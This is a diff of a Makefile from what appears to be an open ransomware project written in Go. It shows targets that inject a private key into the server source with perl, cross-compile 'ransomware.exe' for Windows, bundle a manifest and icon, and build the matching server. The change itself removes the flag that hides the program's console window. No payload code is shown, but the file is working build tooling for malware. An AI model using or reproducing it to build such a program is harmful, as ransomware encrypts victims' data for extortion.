@@ -11,16 +11,16 @@ pre-build:
 	perl -pi.bak -e 's/INJECT_PRIV_KEY_HERE/`echo -n "\n"; cat private.pem`/e' server/main.go
 
 build: pre-build
-	env GOOS=windows go build -ldflags="-H windowsgui" && mv ransomware.exe bin
+	env GOOS=windows go build && mv ransomware.exe bin
 	cd server && go build && mv `ls|grep server` ../bin
 
 simple-build:
 	rsrc -manifest ransomware.manifest -ico icon.ico -o ransomware.syso
 	mkdir -p bin
-	env GOOS=windows go build -ldflags="-H windowsgui" && mv ransomware.exe bin
+	env GOOS=windows go build && mv ransomware.exe bin
 	cd server && go build && mv `ls|grep server` ../bin
 	rm ransomware.syso
-	
+
 clean:
 	rm private.pem public.pem
 	rm ransomware.syso
